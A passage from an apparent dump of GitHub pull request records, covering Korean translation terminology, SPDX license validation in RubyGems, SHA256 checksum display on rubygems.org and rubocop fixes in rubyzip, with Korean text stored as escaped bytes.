\xed\x94\x84\xeb\xa1\x9c\xea\xb7\xb8\xeb\x9e\x98\xeb\xb0\x8d http://krdic.naver.com/detail.nhn?docid=41008600', ""I want \x08to use '\xea\xb0\x9c\xeb\xb0\x9c\xec\x9e\x90' instead of '\xed\x94\x84\xeb\xa1\x9c\xea\xb7\xb8\xeb\x9e\x98\xeb\xa8\xb8'."", '- \xeb\xa9\x94\xeb\x89\xb4\xec\x96\xbc \xe2\x86\x92 \xeb\xa7\xa4\xeb\x89\xb4\xec\x96\xbc http://krdic.naver.com/detail.nhn?docid=12976200\r\n- \xec\x8b\xa0\xed\x85\x8d\xec\x8a\xa4 \xe2\x86\x92 \xec\x8b\xa0\xed\x83\x9d\xec\x8a\xa4\r\n- \xed\x95\x98\xec\x9d\xbc\xeb\x9d\xbc\xec\x9d\xb4\xed\x8c\x85 \xe2\x86\x92 \xed\x95\x98\xec\x9d\xb4\xeb\x9d\xbc\xec\x9d\xb4\xed\x8c\x85 http://krdic.naver.com/rescript_detail.nhn?seq=39\r\n- \xeb\xb8\x8c\xeb\x9d\xbc\xec\x9a\xb0\xec\xa0\xb8 \xe2\x86\x92 \xeb\xb8\x8c\xeb\x9d\xbc\xec\x9a\xb0\xec\xa0\x80\r\n- \xeb\xb0\x94\xeb\x94\x94 \xe2\x86\x92 \xeb\xb3\xb4\xeb\x94\x94 or \xeb\xaa\xb8\xed\x86\xb5 http://krdic.naver.com/detail.nhn?docid=16924400\r\n- \xed\x8c\x8c\xeb\x9d\xbc\xeb\xaf\xb8\xed\x84\xb0 \xe2\x86\x92 \xeb\xa7\xa4\xea\xb0\x9c \xeb\xb3\x80\xec\x88\x98 or \xec\x9d\xb8\xec\x9e\x90\r\n- \xeb\xa6\xac\xec\x8a\xa4\xed\x8a\xb8 \xe2\x86\x92 \xeb\xb0\xb0\xec\x97\xb4 (for code), \xeb\xaa\xa9\xeb\xa1\x9d\r\n- \xec\x83\xb5 \xe2\x86\x92 \xec\x83\xa4\xed\x94\x84 http://krdic.naver.com/detail.nhn?docid=9466900#FGN9740 (but weird)', 'We use \xec\x9d\xb8\xec\x9e\x90 for `argument`. and I do not want to confuse people. -0-\r\nalso, We use \xeb\xb0\xb0\xec\x97\xb4 for `array`.', ""Okay, then how about '\xeb\xa7\xa4\xea\xb0\x9c \xeb\xb3\x80\xec\x88\x98'?\r\nhttp://ko.wikipedia.org/wiki/%EB%A7%A4%EA%B0%9C%EB%B3%80%EC%88%98\r\n\r\nThere is no section for computer science, but English version has it."", ""and, I agree with `\xec\x83\xb5 \xe2\x86\x92 \xec\x83\xa4\xed\x94\x84` is weird. I'll leave it as it is. "", '`\xeb\xa7\xa4\xea\xb0\x9c \xeb\xb3\x80\xec\x88\x98` is accepted. :+1: ', '- \xec\x96\xb5\xec\x84\xb8\xec\x8a\xa4 \xe2\x86\x92 \xec\x95\xa1\xec\x84\xb8\xec\x8a\xa4 http://krdic.naver.com/detail.nhn?docid=25563200\r\n- \xed\x8c\xa9\xed\x82\xa4\xec\xa7\x80 \xe2\x86\x92 \xed\x8c\xa8\xed\x82\xa4\xec\xa7\x80 http://krdic.naver.com/detail.nhn?docid=40276100\r\n- \xec\xbb\xa8\xeb\xb0\xb4\xec\x85\x98, \xec\xbb\xa8\xeb\xb2\xa4\xec\x85\x98 \xe2\x86\x92 \xea\xb4\x80\xeb\xa1\x80\r\n- \xed\x8e\x91\xec\x85\x98 \xe2\x86\x92 \xed\x95\xa8\xec\x88\x98\r\n- \xed\x81\xb4\xeb\xa1\x9c\xec\xa0\xb8 (also) \xe2\x86\x92 \xed\x81\xb4\xeb\xa1\x9c\xec\xa0\x80\r\n- \xed\x95\xb4\xec\x89\xac \xe2\x86\x92 \xed\x95\xb4\xec\x8b\x9c http://krdic.naver.com/detail.nhn?docid=41900200#FGN30345\r\n- \xec\x96\xb4\xeb\xa0\x88\xec\x9d\xb4 (also) \xe2\x86\x92 \xeb\xb0\xb0\xec\x97\xb4 (for Ruby)\r\n\r\n    We should be careful for this:\r\n    > \xed\x95\x9c \xec\xa2\x85\xeb\xa5\x98\xec\x9d\x98 \xeb\xa6\xac\xec\x8a\xa4\xed\x8a\xb8 \xec\xbb\xa8\xed\x85\x8c\xec\x9d\xb4\xeb\x84\x88(\xeb\xb0\xb0\xec\x97\xb4) \xeb\xb0\x96\xec\x97\x90 \xec\x97\x86\xec\x9c\xbc\xeb\xa9\xb0 \xeb\xb0\xb0\xec\x97\xb4\xec\x9d\x80 \xeb\xb3\x80\xea\xb2\xbd \xea\xb0\x80\xeb\x8a\xa5\xed\x95\xa9\xeb\x8b\x88\xeb\x8b\xa4.\r\n- \xec\x8b\x9c\xed\x80\xb8\xec\x8a\xa4 \xe2\x86\x92 \xec\x8b\x9c\xed\x80\x80\xec\x8a\xa4 http://krdic.naver.com/detail.nhn?docid=23612200\r\n- \xec\x96\xb4\xed\x8a\xb8\xeb\xa6\xac\xeb\xb7\xb0\xed\x8a\xb8 \xe2\x86\x92 \xec\x86\x8d\xec\x84\xb1 http://ko.wikipedia.org/wiki/%EC%86%8D%EC%84%B1_(%EC%BB%B4%ED%93%A8%ED%84%B0_%EA%B3%BC%ED%95%99)\r\n- \xeb\xb9\x8c\xed\x8a\xb8-\xec\x9d\xb8 \xe2\x86\x92 \xeb\xb9\x8c\xed\x8a\xb8\xec\x9d\xb8\r\n- \xec\xbb\xa8\xed\x83\xa0\xed\x8a\xb8 (also) \xe2\x86\x92 \xec\xbd\x98\xed\x85\x90\xec\xb8\xa0\r\n- \xec\xbd\x9c\xeb\x9e\x99\xec\x85\x98 \xe2\x86\x92 \xec\xbb\xac\xeb\xa0\x89\xec\x85\x98 http://krdic.naver.com/detail.nhn?docid=38636300#FGN24884\r\n\r\nYou can append the terms marked with `(also)` to the each existing item in your commit message.', '- \xeb\xa6\xac\xec\x84\x9c\xec\xb9\x98 \xe2\x86\x92 \xec\x97\xb0\xea\xb5\xac\r\n- \xed\x95\xbc\xed\x94\x84 \xe2\x86\x92 \xed\x97\xac\xed\x94\x84\r\n- \xec\x8a\xa4\xed\x85\x8c\xed\x8b\xb1, \xec\x8a\xa4\xed\x83\x9c\xed\x8b\xb1 \xe2\x86\x92 \xec\xa0\x95\xec\xa0\x81\r\n- \xec\x99\x80\xec\x9d\xb4\xec\x96\xb4\xeb\xa0\x88\xec\x8a\xa4 \xe2\x86\x92 \xeb\xac\xb4\xec\x84\xa0\r\n- \xed\x94\x8c\xeb\xa0\x88\xeb\x8b\x9d \xe2\x86\x92 \xed\x94\x8c\xeb\x9e\x98\xeb\x8b\x9d http://krdic.naver.com/detail.nhn?docid=41056300#FGN29566\r\n- \xeb\xa9\x94\xeb\x8b\x88\xec\xa7\x95, \xeb\xa7\xa4\xeb\x8b\x88\xec\xa7\x95 \xe2\x86\x92 \xea\xb4\x80\xeb\xa6\xac, \xec\x9a\xb4\xec\x98\x81', ""- \xed\x83\x9c\xec\x8a\xa4\xed\x81\xac \xe2\x86\x92 \xec\x9e\x91\xec\x97\x85\r\n- \xeb\xa0\x88\xec\x9d\xbc\xec\x8a\xa4 \xe2\x86\x92 \xeb\xa0\x88\xec\x9d\xbc\xec\xa6\x88 http://ko.wikipedia.org/wiki/%EB%A3%A8%EB%B9%84_%EC%98%A8_%EB%A0%88%EC%9D%BC%EC%A6%88\r\n- \xec\x97\x85\xea\xb7\xb8\xeb\x9e\x98\xec\x9d\xb4\xeb\x93\x9c \xe2\x86\x92 \xec\x97\x85\xea\xb7\xb8\xeb\xa0\x88\xec\x9d\xb4\xeb\x93\x9c\r\n- \xeb\xa8\xb8\xec\x8b\xa0 \xe2\x86\x92 \xea\xb8\xb0\xea\xb8\xb0\r\n- \xed\x8c\xa8\xed\x82\xa4\xec\xa7\x80 \xeb\xa7\xa4\xeb\x8b\x88\xec\xa0\x80 \xec\x86\x8c\xed\x94\x84\xed\x8a\xb8\xec\x9b\xa8\xec\x96\xb4 \xe2\x86\x92 \xed\x8c\xa8\xed\x82\xa4\xec\xa7\x80 \xea\xb4\x80\xeb\xa6\xac \xec\x86\x8c\xed\x94\x84\xed\x8a\xb8\xec\x9b\xa8\xec\x96\xb4\r\n- \xeb\xa6\xac\xeb\xb9\x84\xec\xa0\xbc \xe2\x86\x92 \xeb\xa6\xac\xeb\xb9\x84\xec\xa0\x84\r\n- \xec\x8a\xa4\xec\xbc\x80\xec\xa5\xb4, \xec\x8a\xa4\xec\xbc\x80\xec\xa4\x84 \xe2\x86\x92 \xec\x9d\xbc\xec\xa0\x95 http://krdic.naver.com/detail.nhn?docid=23179600\r\n- pull request(s) \xe2\x86\x92 \xed\x92\x80 \xeb\xa6\xac\xed\x80\x98\xec\x8a\xa4\xed\x8a\xb8\r\n- \xeb\xa6\xac\xed\x8c\x8c\xec\xa7\x80\xed\x86\xa0\xeb\xa6\xac, \xeb\xa0\x88\xed\x8c\x8c\xec\xa7\x80\xed\x86\xa0\xeb\xa6\xac \xe2\x86\x92 \xeb\xa6\xac\xed\x8f\xac\xec\xa7\x80\xed\x84\xb0\xeb\xa6\xac (but can't find out whether it follows loanword orthography, at least use only one variation)\r\n- \xed\x8d\xbc\xeb\xb8\x94\xeb\xa6\xac\xec\x8b\x9c \xe2\x86\x92 \xeb\xb0\xb0\xed\x8f\xac, \xea\xb3\xb5\xea\xb0\x9c\r\n- \xeb\xb2\x84\xec\xa0\x80\xeb\x8b\x9d \xec\xa0\x95\xec\xb1\x85 \xe2\x86\x92 \xeb\xb2\x84\xec\xa0\x84 \xec\xa0\x95\xec\xb1\x85 (I think this makes sense)\r\n- \xec\xbb\xac\xeb\x9e\x99\xec\x85\x98 (also) \xe2\x86\x92 \xec\xbb\xac\xeb\xa0\x89\xec\x85\x98\r\n- \xed\x8e\x98\xec\xb9\x98 \xe2\x86\x92 \xed\x8c\xa8\xec\xb9\x98 http://krdic.naver.com/detail.nhn?docid=40275800#FGN28169\r\n- \xec\x97\xa1 \xe2\x86\x92 \xec\x95\xb1\r\n- \xed\x94\x84\xeb\xa6\xac\xec\xa0\xa0\xed\x85\x8c\xec\x9d\xb4\xec\x85\x98 \xe2\x86\x92 \xed\x94\x84\xeb\xa0\x88\xec\xa0\xa0\xed\x85\x8c\xec\x9d\xb4\xec\x85\x98 http://krdic.naver.com/detail.nhn?docid=41005000\r\n\r\nPhew, I'm done! :relieved:\r\n\r\nNote: The '\xec\xbd\x94\xeb\xa9\x98\xed\x8a\xb8' in the commit message is bit weird. I see ')\xc2\xbd\xc2\x94\xeb\xa9\x98\xed\x8a\xb8'. Is it only for GitHub?"", ""OK, I'm done too.\r\n@yous Thank you for your hard work. It looks much clear then before.\r\n> Note: The '\xec\xbd\x94\xeb\xa9\x98\xed\x8a\xb8' in the commit message is bit weird. I see ')\xc2\xbd\xc2\x94\xeb\xa9\x98\xed\x8a\xb8'. Is it only for GitHub?\r\n\r\nIt's just mojibake. I fixed it. \r\n\r\n@namsk review please!"", ""Nice work! :+1:\r\n\r\n- There is only one item in your commit message that has `->` instead of `\xe2\x86\x92`:\r\n\r\n    > - \xeb\xa6\xac\xec\x8a\xa4\xed\x8a\xb8 -> \xeb\xaa\xa9\xeb\xa1\x9d (except python's list, mailing list)\r\n- The short version of the URL for '\xec\xbd\x94\xeb\xa9\x98\xed\x8a\xb8': http://krdic.naver.com/rescript_detail.nhn?seq=2187\r\n- Also for '\xed\x81\xb4\xeb\xa0\x88\xec\x9e\x84': http://krdic.naver.com/detail.nhn?docid=38966600#FGN26161"", 'Wow.\r\nCould I merge this Pull Request?', ""I'm not sure whether non-ASCII in commit messages might cause problems..."", '@stomar Good point.', 'awesome work here!!!!! :+1: ']"
640,rubygems/rubygems,1249.0,"This pull request adds warnings about invalid [SPDX license identifiers](http://spdx.org/licenses) in `licenses` metadata.

I mentioned in #1247 that despite [mention of SPDX in the current specification](https://github.com/rubygems/rubygems/blob/master/lib/rubygems/specification.rb#L561), a [frequency chart of `licenses` strings in current RubyGems metadata](https://gist.github.com/kemitchell/31911e3b750af04e6186) shows that variations on `""BSD-2-Clause""`, `""Apache-2.0""`, and other identifiers abound. Ambiguous strings that could reference any one of several distinct license versions, like `""Apache""` and especially `""BSD""`, are very common. This makes automated license audit more difficult than it should be.

~~This pull request does _not_ update the documentation or specification code regarding non-standard or custom licenses. For npm/npm#8179, we decided to coin a custom ID, valid within the broader SPDX 2.0 spec, to mean ""refer to weirdness in LICENSE"", and recommended that for non-standard license situations.~~

~~That kind of licensing is thankfully rare on RubyGems, but without further change, non-standard licensors won't have any way to both comply with the spec and clear the warning. It's a bit of a bikeshed. Let me know if it needs to be painted to match this PR, and how.~~

Please forgive any style faux pas in my patch. This is my first PR to RubyGems, and while Ruby's a fond old friend, it's been a little while. I will push and force-push as directed to make it clean.

Thanks to all for continuing to make RubyGems amazing!","[""Just move the `require`, and this patch should be fine.  Thanks for the work!!\r\n\r\n> That kind of licensing is thankfully rare on RubyGems, but without further change, non-standard licensors won't have any way to both comply with the spec and clear the warning.\r\n\r\nWe could probably introduce a method that adds the non-standard license to the list so it would bypass the warning.  I saw your numbers, but I don't remember, how rare were non-standard licenses?  I think that should influence whether or not we need to support them right away."", ""@tenderlove, it's difficult to say from metadata alone how many projects are custom-licensed. The largest sub-population of Gems have no `licenses` metadata, and I suppose that's where most of the oddly licensed stuff is hiding.\r\n\r\nA few packages already refer to LICENSE, like `See LICENSE` or `See LICENSE file`. I haven't gone back to identify those modules and check the LICENSE files, but I will if you'd like.\r\n\r\nYour experience is doubtless broader than mine, but I do check the licenses of Gems I work with, and I don't know that I could name a custom-licensed one off-hand. Maybe put a call out on Twitter?"", ""I've just force-pushed to `Gem.autoload :SPDX`, rather than conditionally `require`."", ""> Your experience is doubtless broader than mine, but I do check the licenses of Gems I work with, and I don't know that I could name a custom-licensed one off-hand. Maybe put a call out on Twitter?\r\n\r\nWe have to check the licenses for our stuff at work, so this is a good PR for me.  The only gem that comes to mind is Sidekiq Pro. @mperham what license is the pro version of Sidekiq?"", ""Sidekiq Pro's COMM-LICENSE is [right here](https://github.com/mperham/sidekiq/blob/master/COMM-LICENSE).  It's adapted from the Sencha JS framework's commercial license."", ""If a gem is packaged with a non-open source license, I wonder if anyone cares what license it is.  It's important to know the type of license for open source stuff.  I'm not sure about commercial.\r\n\r\n@mperham sorry I'm not up on this, but how do you distribute the pro version? Through rubygems.org? Also, what (if anything) do you put in the gemspec for the license?"", 'I have my own private gem server with HTTP access limited to customers only.  Here\'s the gemspec, I\'d be happy to change it to whatever term is standard for my situation (e.g. ""Custom""?)\r\n\r\n```ruby\r\ngem.license = ""Commercial""\r\n```\r\n\r\nYou might also check with the Passenger Enterprise folks.  Not sure how their distribution works.\r\n\r\nOh, the distribution is trivial in a Gemfile:\r\n\r\n```ruby\r\nsource ""custom http url"" do\r\n  gem \'sidekiq-pro\'\r\nend\r\n```', 'TBH ""Commercial"" is fine with me. We could just add a conditional that doesn\'t warn if the license is set to ""Commercial"".  @kemitchell any thoughts on this?', 'We\'re using `spec.license = ""Proprietary""` in our gemspecs.', '@tenderlove, I think defining some extra, magical value to mean ""not on the list"" is a good approach. As I mentioned, npm is taking that route in its next release.\r\n\r\n""Commercial"" could be misleading, though, since a license very well might be both non-standard and non-commercial. SPDX have assigned identifiers for a great many licenses, even one-offs like `Ruby` and `JSON`, but they can\'t possibly keep up with all the vanity licenses and variants.\r\n\r\nIn choosing a ""magic value"", another concern is avoiding anything that SPDX might later assign to a license. ""Commercial"" strikes me as unlikely, but possible. An alternative that hints at how to resolve ambiguity, like `See LICENSE`, might be helpful.', ""@kemitchell here are the non-spdx scenarios I believe we are discussing and a suggested (just for discussion) treatment\r\n\r\n| license data | suggested treament\r\n| ------------------| ----------\r\n| license not set | warn license is missing, recommend one, reference some link\r\n| not on the spdx list |  warn license is not on spdx list, reference spdx, (and/or instructions to add to update rubygems?)\r\n| not in spdx format |  warn, link to recommended format\r\n| 'commercial / propriety / all rights reserved' | no action\r\n| 'see license' |  warn that it's easier to consume licenses via the github api when they are specified in the gemspec.  recommend, perhaps, 'commercial, see license.' or some such\r\n\r\nFWIW, heres some language I wrote a few years ago:\r\n\r\n>   Including a license in your gemspec is an easy way for rubygems.org and other tools to check how your gem is licensed.  As you can imagine, scanning your repository for a LICENSE file or parsing the README, and then attempting to identify the license or licenses is much more difficult and more error prone. So, even for projects that already specify a license, including a license in your gemspec is a good practice. See, for example, how [rubygems.org uses the gemspec to  display the rails gem license](https://rubygems.org/gems/rails).\r\n  There is even a [License Finder gem](https://github.com/pivotal/LicenseFinder) to help companies/individuals ensure all gems they use meet their licensing needs. This tool depends on license information being available in the gemspec.  This is an important enough issue that *even Bundler now generates gems with a default 'MIT' license*.\r\n  Appendix:\r\n  If you need help choosing a [license](http://opensource.org/licenses), GitHub has created a [license picker tool](http://choosealicense.com/).  Code without a license specified defaults to 'All rights reserved'-- denying others all rights to use of the code.\r\n  Here's a [list of the license names I've found and their frequencies](https://github.com/bf4/gemproject/blob/master/license_usage.csv)\r\n\r\n(disclosure: I added the SPDX reference in https://github.com/rubygems/rubygems/pull/917 and added the language / category to recommend a license https://github.com/rubygems/rubygems/pull/713) \r\n\r\nsome other perhaps useful links: https://github.com/bf4/gemproject/blob/master/licenses.md"", 'I should add, I think this is a great issue and PR! (sorry I left that out of my previous comment) :100: :heart: ', ""I am working to add generation of a `.json` list to the Java tools that build spdx.org here: spdx/tools#2. Hopefully this ends up as http://spdx.org/licenses/licenses.json fairly soon.\r\n\r\nThat would mean a fairly straightforward script in `util` to pull the current list and roll it into RubyGems for validation.\r\n\r\nPlease let me know if I should open a new PR for that work. Otherwise, I'll keep rolling here."", ""Please note that the new `util` script won't actually work until spdx/tools#2 lands and @goneall uses it to generate and publish the licenses JSON file."", 'This looks great now @kemitchell. Great work!', 'Glad to hear it!\r\n\r\n~~Perhaps I should back out the utility script to another PR pending publication of the JSON file on SPDX.org?~~', ""spdx/tools#2, which adds JSON file generation to the tools used to build spdx.org, has landed. Thanks to @goneall, the [new JSON list of license identifiers](http://spdx.org/licenses/licenses.json) has been [published as a preview, though its existence won't be broadly announced for a little while longer](https://github.com/spdx/tools/issues/3#issuecomment-103658937). I am on the mailing lists and watching the repo for the site generator. In the unlikely event anything relevant to RubyGems changes, I'll be made aware, and follow up.\r\n\r\nIn the meantime, I have amended to fix a few flaws in the new `util` script that generates the license list, as well as to use a generated license list in the commit adding validation.\r\n\r\nI believe that ties up the last of the loose ends."", 'While I\'m not flat out opposed to this change, keep in mind that this basically means we would be maintaining a small database internally, which I\'m generally not a fan of as we would then be responsible for validating and maintaining it going forward.\r\n\r\nAlso, things like this tend to jump from ""I want valid licenses"" to ""I want license enforcement"". I don\'t mean to sound gruff, but I want to make it clear that, so long as I have commit privileges here, there will NEVER be any attempt at license enforcement within rubygems.', 'Thanks for your note! You brought up two really important topics.\r\n\r\nAs for the kind-of-a-database, fortunately SPDX generates the source JSON automatically with revisions to the HTML list, so the work of keeping in sync boils down to running the utility script. The result is more of a cache than original work, to obviate the need for client requests to spdx.org. Even if SPDX issues an identifier for a new license and RubyGems waits a while to update, chances are very slim any Gem will use that new license or want to. So the anticipated cost of an outdated ""cache"" is low approaching zero.\r\n\r\nOn your second point I owe an apology. I\'m not quite sure I know what you mean by license enforcement. Perhaps it\'s come up elsewhere? Regardless, I can say that at least my own interest stops with validation.\r\n\r\nTo the extent follow-on PRs try to go further, I\'d be skeptical as a programmer, on the one hand, and unable to participate as an attorney, on the other. Authors should make up their own minds (with professional advice as needed) on how to license work and what others\' licenses mean. The only position I take is that those decisions should be expressed in a standard machine-readable way if possible.\r\n\r\nTo a certain extent this PR follows on from the decision to mention SPDX in the documentation. But given the caliber of feedback for this patch, I\'d be surprised to see RubeGems slide down a slippery slope of license-related changes after validation. That\'s just my experience; others more acquainted may know better.\r\n\r\nAgain, thanks so much for your comment and the time put into it. Regardless of what does or doesn\'t get merged, this PR has been an amazing experience.\r\n', '@djberg96 what do you mean by ""license enforcement"" and can you describe please how this PR is changing ""license enforcing""?', ""@kemitchell That seems reasonable. As for my grump, the original request (RF #11041) that inspired the addition of the license attribute to the gem spec actually wanted some sort of internal enforcement as well. I don't remember the details (and RubyForge is now defunct) but I think it entailed setting some sort of policy rules client side that would then be checked at gem install time, by comparing your policy to the gem license, to see if you were allowed to install the gem.\r\n\r\nFor previous discussion on the topic please see http://rubyforge.org/pipermail/rubygems-developers/2011-October/006828.html and following.\r\n\r\n@simi This particular PR doesn't have anything to do with license enforcement. I'm just making sure no one gets any funny ideas.\r\n\r\nFor anyone wondering, spdx.org is registered to Jim Zemlin of the Linux Foundation and has been around since 2010. At least, that's what google/whois tells me. If everyone else is ok with that, I'm ok with that.\r\n"", '@djberg96, thanks for taking the time to follow up, and especially for the pipermail link.\r\n\r\nJust to make sure I\'m as transparent on this as I can be: Yes, much of my interest in adding validation to RubyGems stems from interest in making open-source-tools for compliance viable. But I\'m not here to propose adding any such thing to RubyGems, or to set the stage for doing so later. My own fiddling on the problem is all out in ""user space"", where---I\'m writing as a programmer here---I think it belongs.\r\n\r\nPlease let me know if there are any questions about SPDX---standard, organization, or website. I only recently joined their mailing lists, but have got to know a few people involved. I\'ll be happy to run between to the extent that\'s necessary.', ""Basically the license field is free text.  That's not going to change.  However, we do recommend using the SPDX format just for convention.  Adding a validator for that format (this PR), is, I think, a good thing toward spreading the word about the convention.  And caching a copy of the spdx short codes in rubygems seems harmless both in terms of size and churn in exchange for the benefit of highlighting specifying a license. \r\n\r\nThat is, I think a really positive side effect of having a warning is that some gem authors don't consider giving their gem a license, which can cause legal problems (though, admittedly, now that GitHub, bundler, and rails all recommend licenses on new code, that's slowly becoming less common.)\r\n\r\nI [introduced the SPDX recommendation](https://github.com/rubygems/rubygems/pull/1249#issuecomment-101893210) in part because Node was already using it, and it looked like a good reference.  In the absence of any standard, tools such as [license_finder](https://github.com/pivotal/LicenseFinder) ([2](https://github.com/grosser/organization_license_audit)), [licensee](https://github.com/benbalter/licensee), and [ninka](https://github.com/dmgerman/ninka) basically need to parse the license and compare it to a known list, and we all know that hash-key-based lookups are more efficient than value-based? "", '@bf4, thanks especially for the link to ninka. I wasn\'t aware, and it\'s right in my wheelhouse.\r\n\r\nTo your point about Gems without licenses, ""no licenses property"" was the most populous group in [my informal study of licensing in the repository earlier this month](https://gist.github.com/kemitchell/31911e3b750af04e6186). I imagine many of those repositories have some kind of license file or notice somewhere within, though if my experience with npm is any indication, many probably also don\'t, or managed to write ""BSD"" somewhere. \r\n\r\nI can also speak a bit to your point about plaintext license detection. Succeeding with a tolerable error rate more or less requires ML. Folks are fond of squirreling licenses away in README or at the top of one specific source file, and of naming standalone license files more creatively than you might think. For various reasons a great deal more than just license text often ends up in dedicated files, from homespun preambles to terms for related services. (npm has some terms for repository hosting in LICENSE for its CLI, for instance.) It gets messy quick.', ""Just checking in. Thanks again to all who've taken time."", ""@kemitchell This will get merged eventually. I've held off because I'm seeing some test failures (in the current repo, not your stuff), and I'd like to get those worked out before merging any new code."", ""@djberg96 thanks for the update. No rush here. Just want to be sure I'm doing my part."", 'Moving discussion of spdx class name, and how to handle non-spdx license down from [comment above](https://github.com/rubygems/rubygems/pull/1249#discussion_r31532901)\r\n\r\n```ruby\r\nmodule Gem\r\n  class SPDX\r\n    NONSTANDARD = \'Nonstandard\'.freeze\r\n```\r\nI like the idea of \'other\' and of a way to turn off the warning for a non-spdx license, but I don\'t really like the word `Nonstandard`.  I read it and think what\'s the standard it\'s referring to? How do I know if my license is non-standard?  I\'d rather, I think have\r\n\r\n```ruby\r\nrequire ""set""\r\n\r\n##\r\n# License handles listing, validating, and suggesting licenses\r\n\r\nmodule Gem::Licenses\r\n    SPDX = %w[yadda] # :nodoc:\r\n    private_constant :SPDX if defined? private_constant\r\n    COMMERCIAL = [""All rights reserved"", ""Proprietary"", ""Commercial""] # :nodoc:\r\n    private_constant :COMMERCIAL if defined? private_constant\r\n    OTHER = [""See LICENSE""] # :nodoc:\r\n    private_constant :OTHER if defined? private_constant\r\n\r\n    # :startdoc:\r\n  \r\n    ##\r\n    # Set of all licenses\r\n\r\n    def self.all\r\n      free + non_free\r\n    end\r\n\r\n    ##\r\n    # Set of free licenses\r\n\r\n    def self.free\r\n      Set.new(SPDX)\r\n    end\r\n\r\n    ##\r\n    # Set of non-free licenses\r\n\r\n    def self.non_free\r\n       Set.new(COMMERCIAL | OTHER)\r\n    end\r\n\r\n    ##\r\n    # Validates if the given +license+ is in the set of +Licenses.all+\r\n\r\n    def self.valid?(license)\r\n      all.include?(license)\r\n    end\r\n\r\n\r\n    ##\r\n    # Suggests license based on the supplied +license+. Returns an array of\r\n    # alternative license names.\r\n    # e.g. given Apache return maybe you mean Apache-2.0\r\n    # see https://github.com/rubygems/rubygems/blob/800f2e63bc6174b5b4dea5528110b09d89fe3dd1/lib/rubygems/text.rb#L41\r\n    # https://github.com/rubygems/rubygems/blob/800f2e63bc6174b5b4dea5528110b09d89fe3dd1/lib/rubygems/spec_fetcher.rb#L186-L206\r\n    def self.suggest_licenses_from_name license\r\n    end\r\n  end\r\nend\r\n```\r\n\r\nand then in `Gem::Specification`\r\n\r\n```ruby\r\n\r\n  ##\r\n ##\r\n # Whether or not to print license warnings\r\n\r\n def license_warning=(bool)\r\n   @license_warning = bool\r\n end\r\n\r\n ##\r\n # Accessor for #license_warning\r\n # See #license_warning= for details\r\n\r\n def license_warning\r\n   defined?(@license_warning) && @license_warning || self.license_warning = true\r\n end\r\n\r\n def validate packaging = true\r\n\r\n    licenses.each { |license|\r\n      if license.length > 64\r\n        raise Gem::InvalidSpecificationException,\r\n          ""each license must be 64 characters or less""\r\n      end\r\n\r\n      if license_warning && !Gem::Licenses.valid?(license)\r\n        # if possible typos, suggest\r\n        # if \'See LICENSE\' warn that it\'s easier to consume licenses via the github api when they are specified in the gemspec. recommend, perhaps, \'commercial, see license.\' or some such\r\n        warning <<-warning\r\nWARNING: license value \'#{license}\' is invalid.  Use a license identifier from\r\nhttp://spdx.org/licenses or one of \'#{Gem::Licenses.non_free.to_a.join("", "")}\'.\r\nYou may set `spec.license_warning = false` to turn off this warning.\r\n        warning\r\n      end\r\n    }\r\n\r\n    warning <<-warning if license_warning && licenses.empty?\r\nlicenses is empty, but is recommended.  Use a license identifier from\r\nhttp://spdx.org/licenses or one of \'#{Gem::Licenses.non_free.to_a.join("", "")}\'.\r\nYou may set `spec.license_warning = false` to turn off this warning.\r\n    warning\r\n```\r\n\r\nI think renaming the class from `SPDX` to the module `Licenses` also makes it more flexible. If you like any of the above, we\'d also need to change  `util/generate_spdx_license_list.rb`', '@bf4, FYI, there is motion on this for npm.\r\n\r\nThe relevant issue is from https://github.com/npm/npm/issues/8557#issuecomment-113322879 down. The PR is npm/npm#8609. The new ""magic values"", subject back-and-forth on the PRs, are `UNLICENSED` and `/^SEE LICENSE IN (.+)$/`. The semantics are roughly ""no license terms"" and ""nonstandard terms in such-and-such file"", respectively.', ""Just checking in. Don't mean to nag!\r\n\r\nFYI: npm has released with magic values `UNLICENSED` and `SEE LICENSE in $file`.""]"
641,rubygems/rubygems.org,879.0,"We are generating the new sha256 on new pushes, so we can start showing that on #show view and JSON returns.

thoughts @dwradcliffe @indirect @qrush ","['thanks @carlosantoniodasilva :heart: for your review. ', ""@arthurnn :+1: :heart:... it might be nice to post a screenshot I think, just for people to see how it'll look like :)"", '![screenshot 2015-02-15 18 46 34](https://cloud.githubusercontent.com/assets/833383/6205636/3fb05dd8-b543-11e4-9e20-d4901c63b72d.png)\r\n', 'Would it be helpful to add a tooltip or link to guide page on how to verify the checksum as well?', 'LGTM. I like the idea of a tooltip linking to a guide page.', ':+1: on adding a guide page.. I will open an issue there, and once the guide page is done, we can link it back.\r\nthanks all']"
642,rubyzip/rubyzip,226.0,"I run rubocop (https://github.com/bbatsov/rubocop) gem on this project and fix some of problem to try it out.
If maintainers of this project think this is good idea - I can continue to fix code style warnings and creating pull requests for it","['\n[![Coverage Status](https://coveralls.io/builds/2158924/badge)](https://coveralls.io/builds/2158924)\n\nCoverage decreased (-0.0%) to 93.39% when pulling **7a8a8b6fd28986a18e39a56fc407b093c6eccb9d on ShockwaveNN:rubocop_fixes** into **4698e5743eb2af721fb8b4aff6812d1fa95100df on rubyzip:master**.\n', '@ShockwaveNN If you have a time then ok. But rubocop is not enough. You can look on reek and cane.', 'I fixed some trivial problems, I stop now, but try to continue tomorrow', '\n[![Coverage Status](https://coveralls.io/builds/2161215/badge)](https://coveralls.io/builds/2161215)\n\nCoverage decreased (-0.0%) to 93.39% when pulling **f401fffc19b7b95817fbddbf8ef5caf5877c2474 on ShockwaveNN:rubocop_fixes** into **4698e5743eb2af721fb8b4aff6812d1fa95100df on rubyzip:master**.\n', '\n[![Coverage Status](https://coveralls.io/builds/2163891/badge)](https://coveralls.io/builds/2163891)\n\nCoverage decreased (-0.0%) to 93.39% when pulling **da863e4b55a455262d3cc6624078289edca85d82 on ShockwaveNN:rubocop_fixes** into **4698e5743eb2af721fb8b4aff6812d1fa95100df on rubyzip:master**.\n', '\n[![Coverage Status](https://coveralls.io/builds/2164075/badge)](https://coveralls.io/builds/2164075)\n\nCoverage decreased (-0.0%) to 93.39% when pulling **b730387cf2af11e27fef4c50153fcac4b163a7df on ShockwaveNN:rubocop_fixes** into **4698e5743eb2af721fb8b4aff6812d1fa95100df on rubyzip:master**.\n', '\n[![Coverage Status](https://coveralls.io/builds/2168315/badge)](https://coveralls.io/builds/2168315)\n\nCoverage increased (+0.02%) to 93.41% when pulling **7eb06a1efab4b6a3dc3efd34e70d4afd694f9d44 on ShockwaveNN:rubocop_fixes** into **4698e5743eb2af721fb8b4aff6812d1fa95100df on rubyzip:master**.\n', '\n[![Coverage 